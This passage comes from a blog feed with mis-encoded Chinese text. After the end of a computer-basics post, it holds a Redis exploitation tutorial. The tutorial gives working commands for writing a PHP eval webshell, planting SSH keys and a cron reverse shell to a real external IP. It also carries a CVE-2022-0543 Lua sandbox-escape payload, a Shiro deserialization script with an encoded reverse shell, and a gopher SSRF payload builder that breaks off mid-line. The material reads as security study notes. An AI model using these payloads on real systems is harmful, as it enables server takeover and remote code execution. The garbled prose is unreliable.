Œå¬è§æ°´å£¶å«äº†å†å»çœ‹ã€‚<strong>ï¼ˆå¼‚æ­¥ï¼Œéé˜»å¡ï¼‰</strong>è¿™ä¸€æ–¹æ³•çš„å®ç°å°±æ˜¯ä½¿ç”¨äº†å›è°ƒå‡½æ•°ã€‚</p><h1 id="MVCæ¶æ„"><a href="#MVCæ¶æ„" class="headerlink" title="MVCæ¶æ„"></a>MVCæ¶æ„</h1><p><img src="/../images/MVC-1669639280429-1686284933115.png" alt="MVC"></p><h1 id="å°ç«¯åºå’Œå¤§ç«¯åº"><a href="#å°ç«¯åºå’Œå¤§ç«¯åº" class="headerlink" title="å°ç«¯åºå’Œå¤§ç«¯åº"></a>å°ç«¯åºå’Œå¤§ç«¯åº</h1><p><img src="/../images/image-20221209213725351.png" alt="image-20221209213725351"></p><h1 id="HTTPSå•å‘è®¤è¯"><a href="#HTTPSå•å‘è®¤è¯" class="headerlink" title="HTTPSå•å‘è®¤è¯"></a>HTTPSå•å‘è®¤è¯</h1><p><img src="/../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70.png" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70"></p><h1 id="HTTPSåŒå‘è®¤è¯"><a href="#HTTPSåŒå‘è®¤è¯" class="headerlink" title="HTTPSåŒå‘è®¤è¯"></a>HTTPSåŒå‘è®¤è¯</h1><p><img src="/../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70-20201225111905953-1695029830834.png" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70-20201225111905953"></p><h1 id="CGIä¸fastCGI"><a href="#CGIä¸fastCGI" class="headerlink" title="CGIä¸fastCGI"></a>CGIä¸fastCGI</h1><p><a href="https://www.cnblogs.com/tssc/p/10255590.html#_label4_4">å…³äºCGIå’ŒFastCGIçš„ç†è§£ - å¤©ç”Ÿå¸…æ‰ - åšå®¢å›­</a></p><h1 id="X64ã€X86å’ŒX86-64"><a href="#X64ã€X86å’ŒX86-64" class="headerlink" title="X64ã€X86å’ŒX86_64"></a>X64ã€X86å’ŒX86_64</h1><ul><li><p>X64ã€X86å’ŒX86_64éƒ½æ˜¯x86æŒ‡ä»¤é›†æ¶æ„</p></li><li><p>X86æ˜¯x86æŒ‡ä»¤é›†æ¶æ„çš„32ä½ç‰ˆæœ¬ã€‚</p><blockquote><p>â€œx86â€è¿™ä¸ªæœ¯è¯­æºè‡ªIntel 8086å¤„ç†å™¨ï¼Œå®ƒæ˜¯x86å®¶æ—çš„ç¬¬ä¸€æ¬¾å¤„ç†å™¨ã€‚</p></blockquote></li><li><p>X64å’ŒX86_64éƒ½æ˜¯x86æŒ‡ä»¤é›†æ¶æ„çš„64ä½æ‰©å±•ï¼ˆX86_64å°†x86æ¶æ„çš„å…¼å®¹æ€§ä¸x64æ¶æ„çš„å¢å¼ºåŠŸèƒ½ç»“åˆèµ·æ¥ï¼‰</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redisæ¼æ´</title>
      <link href="/2023/05/10/Redis%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/05/10/Redis%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p><a href="https://www.cnblogs.com/Neeo/articles/12673194.html#windows">Redis - å„å¹³å°æ­å»ºRedis - å¬é›¨å±æ¥¼ - åšå®¢å›­ (cnblogs.com)</a></p><p>Vulhub</p><h1 id="åŸºæœ¬äº†è§£"><a href="#åŸºæœ¬äº†è§£" class="headerlink" title="åŸºæœ¬äº†è§£"></a>åŸºæœ¬äº†è§£</h1><p>Redisï¼ˆRemote Dictionary Server )ï¼Œå³è¿œç¨‹å­—å…¸æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APIã€‚</p><p><a href="https://blog.csdn.net/qq_41384743/article/details/98211366">Redisæ•°æ®åº“å¸¸ç”¨å‘½ä»¤</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">redis-cli -h host                        # å…å¯†ç™»å½•</span><br><span class="line">redis-cli -h host -p port -a password    # ä½¿ç”¨ Redis å¯†ç ç™»å½• Redis æœåŠ¡</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿›å…¥å‘½ä»¤è¡Œå</span></span><br><span class="line">config get requirepass # æŸ¥çœ‹å¯†ç </span><br><span class="line">config set requirepass passwd # è®¾ç½®å¯†ç </span><br><span class="line">auth passwd # è®¤è¯</span><br><span class="line">info # ç›¸å…³ä¿¡æ¯</span><br><span class="line">SET key &quot;Hello World&quot;                        # è®¾ç½®é”® key çš„å€¼ä¸ºå­—ç¬¦ä¸² Hello World</span><br><span class="line">GET key                                     # è·å–é”® key çš„å€¼ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œè¿”å› nil ã€‚å¦‚æœkey å‚¨å­˜çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿”å›ä¸€ä¸ªé”™è¯¯</span><br><span class="line">DEL key                                     # åˆ é™¤é”® key</span><br><span class="line">KEYS *                                      # è·å– redis ä¸­æ‰€æœ‰çš„ key,Keys å‘½ä»¤ç”¨äºæŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆç»™å®šæ¨¡å¼ pattern çš„ key</span><br><span class="line">SAVE                                           # ç”¨äºåˆ›å»ºå½“å‰æ•°æ®åº“çš„å¤‡ä»½,åœ¨ redis å®‰è£…ç›®å½•ä¸­åˆ›å»ºdump.rdbæ–‡ä»¶</span><br><span class="line">CONFIG GET requirepass                         # ç”¨äºè·å– redis æœåŠ¡çš„é…ç½®å‚æ•°ï¼Œé€šè¿‡ CONFIG å‘½ä»¤æŸ¥çœ‹æˆ–è®¾ç½®é…ç½®é¡¹</span><br><span class="line">Flushall                                    # ç”¨äºæ¸…ç©ºæ•´ä¸ª Redis æœåŠ¡å™¨çš„æ•°æ®(åˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ key)</span><br><span class="line">SELECT index                                # Redis Select å‘½ä»¤ç”¨äºåˆ‡æ¢åˆ°æŒ‡å®šçš„æ•°æ®åº“ï¼Œæ•°æ®åº“ç´¢å¼•å· index ç”¨æ•°å­—å€¼æŒ‡å®šï¼Œä»¥ 0 ä½œä¸ºèµ·å§‹ç´¢å¼•å€¼ã€‚</span><br></pre></td></tr></table></figure><p><strong>redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡</strong></p><p><code>Redis</code>æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡<code>RESP</code>ï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚</p><p>æŠ“åŒ…</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump port 6379 -w ./redis.pcap</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name khaz</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;khaz&quot;</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ç”¨<code>\r\n</code>éš”å¼€çš„ã€‚</p><p><img src="/../images/image-20221118232305305.png" alt="image-20221118232305305"></p><blockquote><p>å¯¹äº<code>Simple Strings</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>+</code><br>å¯¹äº<code>error</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>-</code><br>å¯¹äº<code>Integer</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>:</code><br>å¯¹äº<code>Bulk Strings</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>$</code><br>å¯¹äº<code>array</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>*</code><br>æ­¤å¤–ï¼Œ<code>RESP</code>èƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„<code>Bulk Strings</code>æˆ–<code>Array</code>çš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤º<code>Null</code>å€¼ã€‚<br>åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥<code>&quot;\r\n&quot;(CRLF)</code>ç»“æŸã€‚</p></blockquote><h1 id="åˆ©ç”¨å¤‡ä»½åŠŸèƒ½å†™å…¥æ–‡ä»¶"><a href="#åˆ©ç”¨å¤‡ä»½åŠŸèƒ½å†™å…¥æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨å¤‡ä»½åŠŸèƒ½å†™å…¥æ–‡ä»¶"></a>åˆ©ç”¨å¤‡ä»½åŠŸèƒ½å†™å…¥æ–‡ä»¶</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>redisæä¾›äº†å¤‡ä»½æ•°æ®åº“çš„åŠŸèƒ½ï¼Œå¤‡ä»½çš„æ–‡ä»¶åå’Œå¤‡ä»½çš„è·¯å¾„éƒ½å¯ä»¥é€šè¿‡</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">config <span class="built_in">set</span> dbfilename</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span></span><br></pre></td></tr></table></figure><p>æ¥æ§åˆ¶,ä»è€Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶å†™åŠŸèƒ½ã€‚</p><h2 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h2><ul><li><p>æ•°æ®åº“å¤‡ä»½ä¸ºå¿«ç…§æ–‡ä»¶å­˜åœ¨ä¸€å®šæ ¼å¼(è„æ•°æ®)ï¼Œæ‰€ä»¥å†™å…¥çš„å†…å®¹éœ€è¦åŠ ä¸Šæ¢è¡Œç¬¦ã€‚</p></li><li><p><code>flushall</code>å‘½ä»¤</p><p><code>flushall</code>å‘½ä»¤ä¼šæ¸…ç©ºæ‰€æœ‰ç¼“å­˜æ•°æ®,è¿™ä¸ªåœ¨ä¸€å®šç¨‹åº¦ä¸ä¼šé€ æˆå·¨å¤§çš„æŸå¤±ï¼Œä½†æ˜¯ä¼šç»™ä¸šåŠ¡ä½“éªŒå¸¦æ¥å½±å“ã€‚</p><p>redisé»˜è®¤æœ‰16ä¸ªæ•°æ®åº“</p><p><img src="/../images/image-20230920152903603.png" alt="image-20230920152903603"></p><p>æ‰€ä»¥ä¸ç”¨<code>flushall</code>æ¥æ¸…ç©ºé»˜è®¤0å·çš„æ•°æ®åº“å†…å®¹ï¼Œåªéœ€è¦åˆ‡æ¢åˆ°å…¶ä»–çš„ç©ºæ•°æ®åº“å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dbsize <span class="comment"># æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„keyæ•°é‡</span></span><br><span class="line">select 4  <span class="comment"># é€‰æ‹©æ²¡æœ‰æ•°æ®çš„æ•°æ®åº“</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="å†™å…¥Webshell"><a href="#å†™å…¥Webshell" class="headerlink" title="å†™å…¥Webshell"></a>å†™å…¥Webshell</h2><ul><li>rootæƒé™æ‰§è¡Œçš„redisæˆ–è€…ä»¥æŸä¸ªwebæœåŠ¡å¯åŠ¨çš„redis</li><li>çŸ¥é“ç½‘ç«™webè·¯å¾„</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 5</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&#x27;\n\n&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;\n\n&#x27;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="å†™å…¥sshå…¬é’¥"><a href="#å†™å…¥sshå…¬é’¥" class="headerlink" title="å†™å…¥sshå…¬é’¥"></a>å†™å…¥sshå…¬é’¥</h2><ul><li>é«˜æƒé™</li></ul><p><img src="/../images/image-20231014092516237.png" alt="image-20231014092516237"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 5</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&quot;\n\nå…¬é’¥å†…å®¹\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell</h2><ul><li><p>rootæƒé™</p></li><li><p>Centosç³»ç»Ÿ</p><blockquote><ol><li><p>å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™</p><p><strong>ubuntu</strong>è¦æ±‚å®šæ—¶ä»»åŠ¡æ–‡ä»¶æƒé™å¿…é¡»æ˜¯<strong>600</strong></p><p><strong>Centos</strong>çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶æƒé™<strong>644</strong>ä¹Ÿèƒ½æ‰§è¡Œ</p></li><li><p>å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™</p></li></ol></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 5</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/124.220.192.120/1234 0&gt;&amp;1\n\n&#x27;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><strong>å®šæ—¶ä»»åŠ¡ä½ç½®</strong></p><ul><li><p>&#x2F;etc&#x2F;crontabæ–‡ä»¶</p><p><img src="/../images/image-20231014145035776.png" alt="image-20231014145035776"></p></li><li><p>&#x2F;etc&#x2F;cron.xxxç›®å½•</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/cron.d/</span><br><span class="line">/etc/cron.hourly/</span><br><span class="line">/etc/cron.daily/</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/cron.monthly/</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231014145327815.png" alt="image-20231014145327815"></p></li><li><p>ç”¨æˆ·å®šæ—¶ç›®å½•</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Debianç³»åˆ—ï¼ˆUbuntuï¼‰</span></span><br><span class="line">/var/spool/cron/crontabs/&lt;username&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RedHatç³»åˆ—ï¼ˆCentosï¼‰</span></span><br><span class="line">/var/spool/cron/&lt;username&gt;</span><br></pre></td></tr></table></figure></li></ul><h1 id="ä¸»ä»å¤åˆ¶RCE"><a href="#ä¸»ä»å¤åˆ¶RCE" class="headerlink" title="ä¸»ä»å¤åˆ¶RCE"></a>ä¸»ä»å¤åˆ¶RCE</h1><ul><li>4.x &gt;&#x3D; Version &lt;&#x3D; 5.0.5</li></ul><blockquote><p>ä¸»ä»å¤åˆ¶æ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚</p><p>å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave).</p><p>æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚</p><p><strong>ä»èŠ‚ç‚¹åœ¨æ¥æ”¶æ•°æ®æ—¶ï¼Œä¼šå…ˆå°†è‡ªèº«çš„æ•°æ®æ¸…ç©ºã€‚</strong></p><p><strong>å»ºç«‹ä¸»ä»å…³ç³»åªéœ€è¦åœ¨ä»èŠ‚ç‚¹æ“ä½œå°±è¡Œäº†ï¼Œä¸»èŠ‚ç‚¹ä¸ç”¨ä»»ä½•æ“ä½œ</strong></p><p>ä¸»ä»å¤åˆ¶RCEç®€å•çš„è¯´å°±æ˜¯å°†Rouge Serverï¼ˆä¸»èŠ‚ç‚¹ï¼‰ä¸Šçš„æ¶æ„.soæ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡ä¸»æœºï¼ˆä»èŠ‚ç‚¹ï¼‰ä¸Šï¼Œä»è€Œè¾¾åˆ°RCEã€‚</p></blockquote><h1 id="Luaæ²™ç›’é€ƒé€¸â€“CVE-2022-0543"><a href="#Luaæ²™ç›’é€ƒé€¸â€“CVE-2022-0543" class="headerlink" title="Luaæ²™ç›’é€ƒé€¸â€“CVE-2022-0543"></a>Luaæ²™ç›’é€ƒé€¸â€“CVE-2022-0543</h1><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><ul><li><p>è¿è¡Œåœ¨Debianç³»åˆ—çš„linuxä¸Šçš„Redis</p><blockquote><p>å®é™…ä¸Šæ˜¯ç³»ç»Ÿé—®é¢˜ï¼Œè€Œä¸æ˜¯redisçš„é—®é¢˜</p><p>åœ¨ Debian ç³»çš„ Linux å‘è¡Œç‰ˆç³»ç»Ÿä¸Šï¼ŒLuaçš„package å˜é‡æ²¡æœ‰è¢«æ­£ç¡®æ¸…é™¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡Œ Lua æ²™ç®±é€ƒé€¸ï¼Œä»è€Œæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p></blockquote></li></ul><p>å€ŸåŠ©Luaæ²™ç®±ä¸­é—ç•™çš„å˜é‡<code>package</code>çš„<code>loadlib</code>å‡½æ•°æ¥åŠ è½½åŠ¨æ€é“¾æ¥åº“<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>é‡Œçš„å¯¼å‡ºå‡½æ•°<code>luaopen_io</code>ã€‚åœ¨Luaä¸­æ‰§è¡Œè¿™ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œå³å¯è·å¾—<code>io</code>åº“ï¼Œå†ä½¿ç”¨å…¶æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ä¸åŒç¯å¢ƒä¸‹çš„libluaåº“è·¯å¾„ä¸åŒï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªæ­£ç¡®çš„è·¯å¾„</strong></p><p>è¿æ¥redisï¼Œä½¿ç”¨<code>eval</code>å‘½ä»¤æ‰§è¡Œä¸Šè¿°è„šæœ¬ï¼š</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">eval &#x27;<span class="keyword">local</span> io_l = <span class="keyword">package</span><span class="variable">.loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>); <span class="keyword">local</span> io = io_l(); <span class="keyword">local</span> f = io<span class="variable">.popen</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;r&quot;</span>); <span class="keyword">local</span> res = f:read(<span class="string">&quot;*a&quot;</span>); f:close(); <span class="keyword">return</span> res&#x27; <span class="number">0</span></span><br></pre></td></tr></table></figure><p>å·¥å…·ä¸€é”®æ‰§è¡Œå‘½ä»¤</p><p><img src="/../images/image-20230920151956149.png" alt="image-20230920151956149"></p><h1 id="Shiro-Redisååºåˆ—åŒ–"><a href="#Shiro-Redisååºåˆ—åŒ–" class="headerlink" title="Shiro-Redisååºåˆ—åŒ–"></a>Shiro-Redisååºåˆ—åŒ–</h1><p>shiroé»˜è®¤å°†sessionå­˜å‚¨åœ¨å†…å­˜é‡Œé¢ã€‚è¿™æ ·å¯¼è‡´shiroçš„sessionæ˜¯ä¸å…±äº«çš„ã€‚ä½¿ç”¨redisæ¥å­˜å‚¨shiro sessionå¯ä»¥è®©å…¶ä»–æœåŠ¡ä¹Ÿå…±äº«shiroçš„è®¤è¯ä¿¡æ¯ã€‚</p><p>è¿‡ç¨‹ï¼šshiroä¼šæ ¹æ®jessionidæ¥æ‰¾åˆ°å­˜å‚¨äºredisä¸­çš„sessionä¿¡æ¯ï¼Œå¹¶å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p><strong>å‘redisä¸­æ’å…¥æ¶æ„sessionä¿¡æ¯</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyyso</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">redis_conn=redis.StrictRedis(host=<span class="string">&quot;192.168.1.104&quot;</span>, port=<span class="number">6379</span>,password=<span class="string">&quot;abc123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># whatever æ˜¯ session åç§°</span></span><br><span class="line">whatever=<span class="string">b&quot;123&quot;</span></span><br><span class="line">key=<span class="string">b&quot;shiro:session:&quot;</span>+whatever</span><br><span class="line">value=pyyso.cb1v192(<span class="string">&#x27;bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line">redis_conn.<span class="built_in">set</span>(key,value)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230920210825530.png" alt="image-20230920210825530"></p><p>æ›´æ”¹æ”¹JESSIONIDä¸º123ï¼Œå†æ¬¡è®¿é—®å³å¯è§¦å‘ååºåˆ—åŒ–ã€‚</p><h1 id="SSRFæ‰“Redis"><a href="#SSRFæ‰“Redis" class="headerlink" title="SSRFæ‰“Redis"></a>SSRFæ‰“Redis</h1><h2 id="ä½ç‰ˆæœ¬æƒ…å†µ"><a href="#ä½ç‰ˆæœ¬æƒ…å†µ" class="headerlink" title="ä½ç‰ˆæœ¬æƒ…å†µ"></a>ä½ç‰ˆæœ¬æƒ…å†µ</h2><p>é…åˆhttpè¯·æ±‚</p><blockquote><p>ä½ç‰ˆæœ¬çš„Redisä¼šå°†httpè¯·æ±‚çš„è¯·æ±‚å¤´å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æ</p></blockquote><h3 id="éœ€è¦è®¤è¯æƒ…å†µ"><a href="#éœ€è¦è®¤è¯æƒ…å†µ" class="headerlink" title="éœ€è¦è®¤è¯æƒ…å†µ"></a>éœ€è¦è®¤è¯æƒ…å†µ</h3><p><strong>å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ</strong></p><ul><li><p>é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é€šè¿‡requirepassæ¥å®šä½å¯†ç </span></span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis/redis.conf</span><br><span class="line">/usr/local/redis/etc/redis.conf</span><br><span class="line">/opt/redis/ect/redis.conf</span><br></pre></td></tr></table></figure></li><li><p>å¼±å¯†ç çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>://<span class="number">192.168</span><span class="number">.174</span><span class="number">.129</span>:<span class="number">6379</span>/AUTH passwd</span><br></pre></td></tr></table></figure><p>è®¤è¯æˆåŠŸ</p><p><img src="/../images/image-20221118222335249.png" alt="image-20221118222335249"></p><p>è®¤è¯å¤±è´¥</p><p><img src="/../images/image-20221118222420964.png" alt="image-20221118222420964"></p></li></ul><h3 id="æœªæˆæƒæƒ…å†µ"><a href="#æœªæˆæƒæƒ…å†µ" class="headerlink" title="æœªæˆæƒæƒ…å†µ"></a>æœªæˆæƒæƒ…å†µ</h3><p><strong>é…åˆdictåè®®</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//x.x.x.x:6379/&lt;Redis å‘½ä»¤&gt;</span></span><br></pre></td></tr></table></figure><p><strong>é…åˆgopheråè®®</strong></p><p>é¦–å…ˆè¦å°†å‘½ä»¤è½¬æ¢ä¸ºRESPåè®®æ ¼å¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, urllib.error</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.163.128&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™é©¬</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span> <span class="comment">#å†™å…¥çš„æ–‡ä»¶å†…å®¹</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span> <span class="comment"># webç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™sshå…¬é’¥</span></span><br><span class="line">/*</span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡åˆ’ä»»åŠ¡åå¼¹shell  ç³»ç»Ÿå¿…é¡»ä¸ºCentosï¼Œå®šæ—¶ä»»åŠ¡æƒé™é—®é¢˜ï¼šCentos--644  Ubuntu--600</span></span><br><span class="line">/*</span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;2333&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 